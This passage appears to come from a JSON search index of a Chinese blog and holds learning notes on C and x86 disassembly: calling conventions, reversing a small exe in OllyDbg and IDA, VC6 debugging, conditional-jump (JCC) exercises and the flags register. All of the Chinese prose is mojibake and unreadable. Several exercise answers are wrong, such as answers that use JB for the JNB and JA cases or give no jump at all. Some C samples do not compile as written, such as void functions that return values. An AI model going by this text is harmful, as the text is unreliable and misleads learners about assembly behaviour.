ˆäº†ï¼Œæ˜¯çš„è¯è¿™ä¸ªå¯ä»¥åŸºæœ¬åˆ¤æ–­å®ƒcallçš„å°±æ˜¯mainå‡½æ•°ç›´æ¥æ­¥è¿‡è¿›å»å³å¯ï¼Œä½†æ˜¯è¿™ä¸ªä¹Ÿä¸æ˜¯ä¸€å®šçš„ï¼Œç»“åˆæ™ºèƒ½odçš„æ³¨é‡Šï¼Œæ³¨é‡Šæœ‰winå†…æ ¸å‡½æ•°è°ƒç”¨å°±ä¸è¦è¿›å…¥å‡½æ•°å°±å¯ä»¥äº†ã€‚ å‡½æ•°è°ƒç”¨çº¦å®šå¸¸è§çš„å‡ ç§çº¦å®šï¼š cdeclä½¿ç”¨VC++ (å…³é—­ä¼˜åŒ–é€‰é¡¹)ç¼–è¯‘ä»£ç ç”Ÿæˆcdecl.exeæ–‡ä»¶åï¼Œä½¿ç”¨OllyDbgè°ƒè¯•:å‡½æ•°çš„å‚æ•°1ã€2ä»¥é€†åºæ–¹å¼å‹äººæ ˆï¼Œè°ƒç”¨Plus(å‡½æ•°( 401014)åï¼Œä½¿ç”¨ADD ESP,8å‘½ä»¤æ•´ç†æ ˆã€‚è°ƒç”¨è€…main()å‡½æ•°ç›´æ¥æ¸…ç†å…¶å‹å…¥æ ˆçš„å‡½æ•°å‚æ•°ï¼Œè¿™æ ·çš„æ–¹å¼å³æ˜¯cdeclã€‚ stdcallstdcallå¸¸ç”¨äºwin32 apiï¼Œåœ¨å¾€åçš„VBä¸­å¾ˆå¸¸è§ã€‚è¿™ä¸ªæ˜¯è‡ªèº«å‡½æ•°å†…éƒ¨è¿›è¡Œæ ˆæ¸…ç†ã€‚è‹¥æƒ³ä½¿ç”¨stdcallæ–¹å¼ç¼–è¯‘æºç ï¼Œåªè¦ä½¿ç”¨_ stdcallå…³é”®å­—å³å¯ã€‚æ ˆçš„æ¸…ç†å·¥ä½œç”±add(å‡½æ•°ä¸­æœ€å( 40100F)çš„RETN 8å‘½ä»¤æ¥æ‰§è¡Œã€‚RETN 8å‘½ä»¤çš„å«ä¹‰ä¸ºRETN+POP 8å­—èŠ‚ï¼Œå³è¿”å›åä½¿ESPå¢åŠ åˆ°æŒ‡å®šå¤§å°ã€‚ åƒè¿™æ ·åœ¨è¢«è°ƒç”¨è€…add)å‡½æ•°å†…éƒ¨æ¸…ç†æ ˆçš„æ–¹å¼å³ä¸ºstdcallæ–¹å¼ã€‚stdcallæ–¹å¼çš„å¥½å¤„åœ¨äºï¼Œ è¢«è°ƒç”¨è€…å‡½æ•°å†…éƒ¨å­˜åœ¨ç€æ ˆæ¸…ç†ä»£ç ï¼Œä¸æ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶éƒ½è¦ç”¨ADD ESP,XXXå‘½ä»¤çš„cdecIæ–¹å¼ç›¸æ¯”ï¼Œä»£ç å°ºå¯¸è¦å°ã€‚ è™½ç„¶Win 32 APIæ˜¯ä½¿ç”¨Cè¯­è¨€ç¼–å†™çš„åº“ï¼Œä½†å®ƒä½¿ç”¨çš„æ˜¯stdcallæ–¹å¼ï¼Œè€Œä¸æ˜¯Cè¯­è¨€é»˜è®¤çš„cdeclæ–¹å¼ã€‚è¿™æ˜¯ä¸ºäº†è·å¾—æ›´å¥½çš„å…¼å®¹æ€§ï¼Œä½¿Cè¯­è¨€ä¹‹å¤–çš„å…¶ä»–è¯­è¨€( Delphi(Pascal)ã€Visual Basicç­‰)ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨APIã€‚ fastcallfastcalæ–¹å¼ä¸stdcallæ–¹å¼åŸºæœ¬ç±»ä¼¼ï¼Œä½†è¯¥æ–¹å¼é€šå¸¸ä¼šä½¿ç”¨å¯„å­˜å™¨(è€Œéæ ˆå†…å­˜)å»ä¼ é€’é‚£äº›éœ€è¦ä¼ é€’ç»™å‡½æ•°çš„éƒ¨åˆ†å‚æ•°(å‰2ä¸ª)ã€‚è‹¥æŸå‡½æ•°æœ‰4ä¸ªå‚æ•°ï¼Œåˆ™å‰2ä¸ªå‚æ•°åˆ†åˆ«ä½¿ç”¨ECXã€EDXå¯„å­˜å™¨ä¼ é€’ã€‚ é¡¾åæ€ä¹‰ï¼Œfastcallæ–¹å¼çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥å®ç°å¯¹å‡½æ•°çš„å¿«é€Ÿè°ƒç”¨(ä»CPUçš„ç«‹åœºçœ‹ï¼Œè®¿é—®å¯„å­˜å™¨çš„é€Ÿåº¦è¦è¿œæ¯”å†…å­˜å¿«å¾—å¤š)ã€‚å•ä»å‡½æ•°è°ƒç”¨æœ¬èº«æ¥çœ‹ï¼Œfastcallæ–¹å¼éå¸¸å¿«ï¼Œä½†æ˜¯æœ‰æ—¶éœ€è¦é¢å¤–çš„ç³»ç»Ÿå¼€é”€æ¥ç®¡ç†ECXã€EDXå¯„å­˜å™¨ã€‚å€˜è‹¥è°ƒç”¨å‡½æ•°å‰ECXä¸EDXä¸­å­˜æœ‰é‡è¦æ•°æ®ï¼Œé‚£ä¹ˆä½¿ç”¨å®ƒä»¬å‰å¿…é¡»å…ˆå¤‡ä»½ã€‚æ­¤å¤–,å¦‚æœå‡½æ•°æœ¬èº«å¾ˆå¤æ‚ï¼Œéœ€è¦æŠŠECXã€EDXå¯„å­˜å™¨ç”¨ä½œå…¶ä»–ç”¨é€”æ—¶ï¼Œä¹Ÿéœ€è¦å°†å®ƒä»¬ä¸­çš„å‚æ•°å€¼å­˜å‚¨åˆ°å¦å¤–æŸä¸ªåœ°æ–¹ã€‚æœ‰èˆä¹Ÿæœ‰å¾—ã€‚ å°±è·Ÿè¿™ç§æƒ…å†µï¼Œä¸€å®šè¦æ³¨æ„å…¶æ˜¯ç›´æ¥ç”¨å¯„å­˜å™¨æ¥ä¼ å‚å’Œè®¡ç®—çš„ï¼Œä¸æ¶‰åŠæ ˆï¼Œä¸è¿‡è¿™ä¸ªä¸å¸¸ç”¨ã€‚è¿™ä¸ªå°±æ˜¯å¸¸ç”¨çš„æƒ…å†µï¼Œä¼ å‚çš„æ—¶å€™ä¼šæŠŠéƒ¨åˆ†çš„å‚æ•°ç”¨å¯„å­˜å™¨æ¥ä¼ ã€‚ ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention.exeï¼‰æ±‡ç¼–åˆ†æç®€å•ä¸€çœ‹ï¼Œè¿™ä¸ªå°±æ˜¯åœåœ¨winmainå…¥å£äº†ï¼Œæ³¨æ„å¯»æ‰¾å‰é¢æ‰€è¯´çš„é‚£ä¸ªæ‰¾callä¹‹å‰æœ‰3ä¸ªå‚æ•°å‹æ ˆæœ€ä¸ºå‡½æ•°å‚æ•°çš„è¯­å¥ï¼Œä¸€ç›´å•æ­¥èµ°ï¼šç–‘ä¼¼å‡ºç°ç¬¦åˆçš„æƒ…å†µï¼Œè¿™æ—¶å€™æŒ‰F7è¿›å»æŸ¥çœ‹å†…éƒ¨ï¼šç®€å•ä¸€çœ‹ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„mainå‡½æ•°ã€‚æ¥ä¸‹æ¥ä¸ºäº†åŠ å¼ºåˆ†æå¯è§‚æ€§ï¼Œæˆ‘æŠŠæ±‡ç¼–ä»£ç éƒ½æ”¾è¿›äº†WPSä¸­è¿›è¡Œåˆ†æï¼šï¼ˆç®­å¤´æŒ‡çš„ä¸æ˜¯ç‰¹åˆ«å¥½â€¦â€¦ï¼‰ é€†æˆcä»£ç #include &quot;stdafx.h&quot; int __stdcall plus2(int a,int b,int c) { return a+b+c; } int __cdecl plus3(int a,int b) { return a+b; } int __fastcall plus(int a,int b,int c,int d,int e) { int z,s; z=plus2(a,b,c); s=plus3(b,a); return plus3(z,s); } int main(int argc, char* argv[]) { int x; x=plus(1,3,4,6,7); printf(&quot;%d\\n&quot;,x); return 0; }è¿™ä¸ªç»ƒä¹ è¿‡ç¨‹å…¶å®æ˜¯ååˆ†è‰°éš¾çš„ï¼Œæˆ‘åˆ†æäº†æœ‰ä¸€ä¸ªå°æ—¶å·¦å³ï¼Œä¸»è¦æ˜¯ å¼€å§‹å¯¹å±€éƒ¨å˜é‡æœ‰äº›ç”Ÿç–ï¼Œå‡½æ•°å†…éƒ¨å®šä¹‰ä¸€ä¸ªå˜é‡åæ±‡ç¼–ä¸­ä¼šå¦‚ä½•æ˜¾ç¤ºã€ fastcallçš„è®¤è¯†ä¸æ˜¯å¾ˆå¥½ ä¼ å…¥çš„6 7åšäº†ä»€ä¹ˆä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šæœ€åç»“åˆidaç”Ÿæˆçš„ä¼ªä»£ç æ‰å®Œæˆï¼Œä¸è¿‡ç»è¿‡è¿™ä¸ªç»ƒä¹ éƒ½å­¦åˆ°äº†å¾ˆå¤šï¼Œä½¿ç”¨idaä¹Ÿæ„Ÿå—åˆ°äº†idaçš„å¼ºå¤§ï¼Œå­¦åˆ°äº†åœ¨å…¶ä¸­å¦‚ä½•çœ‹ä¸€äº›ç®€å•çš„å‡½æ•°ä»¥åŠå…¶ä¸çœŸæ­£æ±‡ç¼–ä»£ç çš„åŒºåˆ«ã€‚","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰","slug":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰","date":"2019-10-19T02:26:17.000Z","updated":"2020-02-28T07:53:48.000Z","comments":true,"path":"2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/","link":"","permalink":"http://chumen77.xyz/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/","excerpt":"","text":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰å‰è¨€ï¼šæœ¬è¯¾ä¸»è¦å­¦ä¹ VCå¼€å‘ç¯å¢ƒçš„ç®€å•ä½¿ç”¨ï¼Œå’Œå‡ ä¸ªå‡½æ•°åæ±‡ç¼–åˆ†æã€‚ ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒè¿™é‡Œæˆ‘ç›´æ¥ç”¨äº†ç¼–ç¨‹è¾¾äººçš„vcè™šæ‹Ÿæœºï¼Œå®˜æ–¹çš„vc6.0ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œæ¯æ¬¡åªæ”¯æŒè°ƒè¯•ä¸€æ¬¡ï¼Œäººå®¶çš„å¯ä»¥çªç ´è¿™ä¸ªé™åˆ¶ã€‚ åˆ›å»ºé¡¹ç›® æ‰§è¡Œè¿‡ç¨‹ä»£ç ç¼–å†™â€“&gt;ç”ŸæˆEXE(F7)â€“&gt;è¿è¡Œ(F5)â€“&gt;ç»“æŸè¿è¡Œ(Shift+F5) ä¸€äº›ç®€å•æ“ä½œè®¾ç½®æ–­ç‚¹è®¾ç½®æ–­ç‚¹æ˜¯å…‰æ ‡æ”¾åˆ°å“ªè¡Œä»£ç åæŒ‰ä¸‹F9å³å¯ï¼Œè¿™ä¹Ÿæ˜¯åé¢å¾ˆå¤šæ“ä½œçš„æœ€é‡è¦çš„èµ·åˆæ“ä½œã€‚ è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£çœ‹å›¾ï¼Œåœ¨ç©ºç™½å¤„å³å‡»ç‚¹å‡»ä¸€ä¸‹ä½ éœ€è¦çš„çª—å£å°±å¥½äº†ã€‚ è¿›å…¥åæ±‡ç¼–çª—å£åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œä¸”æœ‰é€‚å½“æ–­ç‚¹çš„æ—¶å€™ï¼Œçœ‹å›¾ å³å‡»ç¨‹åºæ¡†å†…çš„ç©ºç™½å¤„ï¼Œç„¶åç‚¹å‡»GO to Disassembly å°±å¥½äº†ã€‚åœ¨è¿™é‡Œé¢æœ€é‡è¦çš„æ“ä½œå°±æ˜¯ï¼šF10 F11åˆ†åˆ«æ˜¯æ­¥è¿‡å’Œæ­¥å…¥ã€‚è¿™ä¸ªè·Ÿodé‡Œä¸ä¸€æ ·ã€‚ Cè¯­è¨€çš„è°ƒç”¨1ã€æ— å‚æ•°ï¼Œæ— è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨2ã€æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨3ã€æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨4ã€æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨ å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°å…ˆä¸Šcï¼š#include &quot;stdafx.h&quot; void Function() { } int main(int argc, char* argv[]) { Function() return 0; }åæ±‡ç¼–åˆ†æï¼š å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½ä¸¤ä¸ªæ•°ç›¸åŠ ï¼šcä»£ç ï¼š#include &quot;stdafx.h&quot; void Plus(int x,int y) { return x+y; } int main(int argc, char* argv[]) { Plus(2,1); return 0; }åæ±‡ç¼–åˆ†æï¼š ä¸‰ä¸ªæ•°ç›¸åŠ ï¼šcä»£ç ï¼š#include &quot;stdafx.h&quot; void Plus(int x,int yï¼Œint z) { return x+y; } int main(int argc, char* argv[]) { Plus(2,1,3); return 0; }åæ±‡ç¼–åˆ†æï¼šï¼ˆå’Œä¸Šé¢é‚£ä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯ä¸ºäº†ç»ƒä¹ ï¼Œä¸è¯¦ç»†å†™äº†ï¼‰ å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨è¦æ±‚ï¼šç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°å¯¹ä»»æ„5ä¸ªæ•´æ•°å®ç°åŠ æ³•(ä½¿ç”¨Plus1å’ŒPlus2). cä»£ç #include &quot;stdafx.h&quot; int Plus1(int x,int y) { return x+y; } int Plus2(int x,int y,int z) { return x+y+z; } int Plus3(int a,int b,int c,int d,int e) { int i,j,m; i=Plus1(a,b); j=Plus2(c,d,e); m=Plus1(i,j); return m; } int main(int argc, char* argv[]) { Plus3(2,1,3,1,5); return 0; }åæ±‡ç¼–åˆ†æï¼šï¼ˆä¸­é—´è°ƒç”¨ä¸€ä¸ªPlus1 å’Œ Plus2ï¼Œå°±ä¸å¿…è¿›å…¥åˆ†æäº†ï¼ŒåŸºæœ¬è·Ÿå‰é¢ç®€å•åˆ†æé‚£ä¸¤ä¸ªä¸€æ ·ï¼Œè¿™ä¸ªç»ƒä¹ æ˜¯é¡ºæˆä¸‹æ¥çš„ã€‚ï¼‰ æ€»ç»“ï¼šå­¦å®Œæ±‡ç¼–äº†ï¼Œå°±æ¥ç€Cä¸æ±‡ç¼–ç»“åˆåˆ†æï¼Œæ­¥æ­¥æŠŠå¸¸è§çš„ç»“åˆåˆ†æå®Œã€‚è¿™æ¬¡å­¦ä¹ ä¸ç»ƒä¹ ï¼Œå¯ä»¥ä¸€æ•´æ®µä¸€æ•´æ®µçš„è¯»æ±‡ç¼–ä»£ç äº†ï¼Œï¼ˆè¿™ä¸ªå‰é¢å…¶å®è¿˜æœ‰ç”»è¿‡å †æ ˆå›¾ï¼Œå½“æ—¶æ˜¯ä¸€å¥å¥åˆ†æå­¦ä¹ çš„ï¼Œä¸ºäº†ç†Ÿæ‚‰å †æ ˆå’Œæ±‡ç¼–è¯­å¥ï¼Œæ‰¾æ—¶é—´è¡¥ä¸‹ç¬”è®°ï¼‰ä¹Ÿç†Ÿæ‚‰äº†å‡½æ•°æ˜¯å¦‚ä½•åµŒå¥—è°ƒç”¨çš„ã€‚","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"JCCå­¦ä¹ ","slug":"JCC","date":"2019-10-07T15:09:50.000Z","updated":"2020-09-08T00:02:11.645Z","comments":true,"path":"2019/10/07/JCC/","link":"","permalink":"http://chumen77.xyz/2019/10/07/JCC/","excerpt":"","text":"JCCå­¦ä¹ JCCæŒ‡ä»¤é›†åˆè¯¦ç»†__1ã€JE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬) ZF=1 2ã€JNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0 3ã€JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ SF=1 4ã€JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ SF=0 5ã€JP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1 6ã€JNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=0 7ã€JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ OF=1 8ã€JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ OF=0 9ã€JB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 10ã€JNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=0 11ã€JBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 or ZF=1 12ã€JNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°) CF=0 and ZF=0 13ã€JL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SFâ‰  OF 14ã€JNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SF=OF 15ã€JLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) ZF=1 or SFâ‰  OF 16ã€JNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°) ZF=0 and SF=OF è¡¨æ ¼æ€»ç»“ ç›´æ¥æ‘˜æŠ„çš„åšçš„å¾ˆè¯¦ç»†ï¼Œæ­£å¥½æœ‰åŠ©è®°ï¼Œä½†æ˜¯éœ€è¦å’Œä¸Šé¢è¯¦ç»†æŒ‡ä»¤æ­é…ä½¿ç”¨ï¼Œè¦æ³¨æ„é‚£äº›æœ‰ç¬¦å·çš„JCCè·³è½¬æŒ‡ä»¤ï¼Œå› ä¸ºåœ¨è¿™ä¸ªè¡¨é‡Œæ²¡æœ‰ä½“ç°ã€‚ä¹Ÿä¸ç”¨å¤ªç€æ€¥èƒŒï¼Œç†Ÿæ‚‰ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œæœ‰éƒ¨åˆ†æ˜¯å¯ä»¥ç›´æ¥è®°ä½çš„ï¼Œåœ¨å¾€åé‡åˆ°æ¨¡ç³Šçš„ç›´æ¥æŸ¥ä¸‹å°±å¯ä»¥äº†ã€‚ æ³¨æ„ï¼šJCCæŒ‡ä»¤å†³å®šå®ƒè·³ä¸è·³è½¬è·Ÿåˆ«çš„æ²¡å…³ç³»ï¼Œåªè·ŸEFLAGæ ‡å¿—å¯„å­˜å™¨æœ‰å…³ç³»ï¼Œæ ¹æ®ç¬¦å·ä½æ¥è¿›è¡Œè·³è½¬çš„ ç»ƒä¹ ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬.å‰æï¼šèƒ½ç”¨CMPå’ŒTESTå®ç°çš„ä¼˜å…ˆè€ƒè™‘. 1ã€JE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬) ZF=1MOV AL,1 MOV CL,1 CMP AL,CL JE 0X0040102B 2ã€JNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0MOV AL,1 TEST AL,AL JNZ 0X00401006 3ã€ JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ SF=1MOV AL,1 MOV CL,2 CMP AL,CL 4ã€ JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ SF=0XOR EAX,EAX JNS 0X0040102F 5ã€ JP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1MOV AL,2 MOV CL,2 CMP AL,CL JPE 0X00401008 6ã€JNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ PF=0MOV AL,2 MOV CL,1 CMP AL,CL JPE 0X00401008 7ã€ JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ OF=1MOV AL,80 SUB AL,10 JO 0X00401008 8ã€ JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ OF=0MOV AX,0FFFF ADD AX,80 JNO 0X00401010 9ã€ JB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1MOV AX,80 MOV CX,90 CMP AX,CX JB 0X0040103E 10ã€ JNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=0MOV AX,80 MOV CX,90 CMP CX,AX JB 0X00401044 11ã€ JBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 or ZF=1ä¸€ç§ç›´æ¥è·Ÿç»ƒä¹ 9ä¸€æ ·ç›´æ¥æ„é€ è®©CF=1æˆ–è€…è®©è·Ÿç»ƒä¹ 1è®©ZF=0å°±å¯ä»¥äº†ã€‚ MOV AL,1 MOV CL,1 CMP AL,CL JE 0X0040102B æˆ–è€… MOV AX,80 MOV CX,90 CMP AX,CX JB 0X0040103E 12ã€ JNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°) CF=0 and ZF=0MOV AX,80 MOV CX,90 CMP CX,AX JB 0X00401044 è§£æï¼š è¿™ä¸ªä¸ç»ƒä¹ 10çš„åŒºåˆ«å°±æ˜¯ä¸å¯ä»¥è®©ä¸¤ä¸ªæ•°ç›¸ç­‰ã€‚ 13ã€ JL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SFâ‰  OFMOV AL,0XFF MOV CL,0X01 CMP AL,CL JB 0X00401063 JL 0X00401063 è§£æï¼šç»ˆäºåˆ°äº†è®©æˆ‘ååˆ†è¿·æƒ‘çš„æœ‰æ— ç¬¦å·JCCçš„è·³è½¬æŒ‡ä»¤ï¼Œè¿™é‡Œåšäº†å¯¹æ¯”JB JL,çœ‹æ ‡å¿—ä½è‚¯å®šèƒ½è§£å†³ä¸€åˆ‡ï¼ˆè¿™æ˜¯å¯¹è®¡ç®—æœºæ¥è¯´ï¼‰ï¼Œæˆ‘ä»¬æ²¡çœ‹æ ‡å¿—ä½æå‰åšåˆ¤æ–­çš„è¯€çªï¼šå°±æ˜¯å½“ä½ ç”¨æœ‰ç¬¦å·æ•°JCCæŒ‡ä»¤ï¼ˆJG,JL,JLE,JGEï¼ŒJNGï¼ŒJNL,JNGEï¼ŒJNLEï¼‰çš„æ—¶å€™ï¼Œä¸€å®šè¦æŠŠä¸¤ä¸ªæ“ä½œæ•°ç›´æ¥äººå·¥çœ‹åšæœ‰ç¬¦å·æ¥çœ‹ï¼ æ¯”å¦‚è¿™ä¸ªç»ƒä¹ ç”¨åˆ°äº†JL,FFå°±æ˜¯-1äº†ï¼Œé‚£ä¹ˆ-1&lt;1è¿™ä¸ªè‚¯å®šçš„ï¼Œæ‰€ä»¥JLè·³è½¬ã€‚ä½†æ˜¯å¯¹äºJBï¼ŒFFå°±æ˜¯FFè‚¯å®šå¤§äº1ï¼Œæ‰€ä»¥æ²¡æœ‰è·³è½¬ã€‚ 14ã€ JNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SF=OFMOV AL,1 MOV CL,0CC CMP AL,CL JGE 0X0040108B 15ã€ JLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) ZF=1 or SFâ‰  OFMOV AL,1 MOV CL,0CC CMP CL,AL JGE 0X0040108B è¿™ä¸ªå°±æ˜¯å¯¹ç«‹15ç»ƒä¹ ï¼Œæƒ³åˆ©ç”¨ZFç­‰äº1è¿™ä¸ªè·³è½¬ï¼Œåœ¨cmpä¸­æ²¡ä»€ä¹ˆå¥½æ•´çš„ï¼Œè¿™ä¸¤ä¸ªæ“ä½œæ•°åªèƒ½æ˜¯ç›¸åŒçš„æ•°ï¼Œæ²¡ä»€ä¹ˆçœ‹ä¸çœ‹åšæœ‰æ— ç¬¦å·çš„è¯´æ³•ã€‚ 16ã€ JNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°) ZF=0 and SF=OFMOV AX,1 MOV CX,FF CMP AX,CX JG 0x004010A6 MOV AL,1 MOV CL,0FF CMP AL,CL JG 0x004010A6 è§£æï¼š åˆ¤æ–­ä¸€ä¸‹ï¼Œç¬¬1æ®µä»£ç å¯¹è¿˜æ˜¯ç¬¬2æ®µä»£ç å¯¹ï¼Ÿ åœ¨åŸæ¥çš„è§‚ç‚¹ï¼Œå¯¹æœ‰ç¬¦å·JCCè¦æŠŠä¸¤ä¸ªæ“ä½œæ•°çœ‹åšè½¬åŒ–åçš„æœ‰ç¬¦å·æ•°å¯¹å¾…ï¼Œä¸”ä¸€å®šè¦æ³¨æ„ä¸‹æ•°æ®å®½åº¦ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€æ®µä»£ç æ˜¯æ— æ³•å®ç°JGè·³è½¬çš„ï¼Œå› ä¸ºå…¶æ•°æ®å®½åº¦çš„é—®é¢˜ï¼Œå½±å“åˆ°SF,æ‰€ä»¥å…¶æ²¡åŠæ³•SF=OFå°±æ²¡æ³•è·³è½¬ã€‚","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"æ ‡å¿—å¯„å­˜å™¨","slug":"æ ‡å¿—å¯„å­˜å™¨","date":"2019-10-06T14:01:14.000Z","updated":"2020-09-08T00:02:21.792Z","comments":true,"path":"2019/10/06/æ ‡å¿—å¯„å­˜å™¨/","link":"","permalink":"http://chumen77.xyz/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/","excerpt":"","text":"æ ‡å¿—å¯„å­˜å™¨éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»éœ€è¦å…ˆç†Ÿç»ƒè®°ä½è¿™å‡ ä¸ªå¯„å­˜å™¨çš„ä½ç½®å’Œåç§°ï¼šCF PF AF ZF SF OF CFè¿›ä½æ ‡å¿—CF(Carry Flag):å¦‚æœè¿ç®—ç»“æœçš„æœ€é«˜ä½äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–å€Ÿä½ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ è§£æï¼šåœ¨çœ‹è¿ç®—ç»“æœçš„æ—¶å€™ï¼Œå…ˆæå‰ç¡®å®šå¥½å‚ä¸è¿ç®—çš„æ•°æ˜¯æœ‰æ— ç¬¦å·æ•°å’Œå®ƒä»¬çš„æ•°æ®å®½åº¦ã€‚å…¶ä¸PFçš„éš¾è¾¨éš¾åˆ†ï¼Œé‡ç‚¹æ˜¯çœ‹å‚ä¸è¿ç®—çš„æ•°æ˜¯å¦ä¸ºæ— ç¬¦å·æ•°ï¼Œè¿™ä¸ªæ˜¯ç¨‹åºå‘˜å†™ä»£ç çš„æ—¶å€™å®šä¹‰çš„ã€‚é»˜è®¤éƒ½æ˜¯æœ‰ç¬¦å·çš„ï¼Œè¿™å°±ä¸»è¦çœ‹åé¢çš„PFäº†ã€‚ PFå¥‡å¶æ ‡å¿—PF(Parity Flag)ï¼šPFæ ‡å¿—ä½ï¼Œæ ¹æ®ç»“æœä¸­æœ€ä½æœ‰æ•ˆå­—èŠ‚(æœ€ä½8ä½)ä¸­â€œ1â€çš„ä¸ªæ•°æ¥ç¡®å®šç½®1è¿˜æ˜¯æ¸…0ã€‚å¦‚æœâ€œ1â€çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œåˆ™PFçš„å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ è§£æï¼šè¿™ä¸ªåœ¨å¾ˆå¤šæ•™æä¸­æ˜¯é”™çš„ï¼Œè¿™ä¸ªéœ€è¦å¼ºè°ƒæ ¹æ®çš„æ˜¯è¿ç®—ç»“æœçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æœ€ä½8ä½é‡Œé¢1çš„ä¸ªæ•°ã€‚ AFè¾…åŠ©è¿›ä½æ ‡å¿—AF(Auxiliary Carry 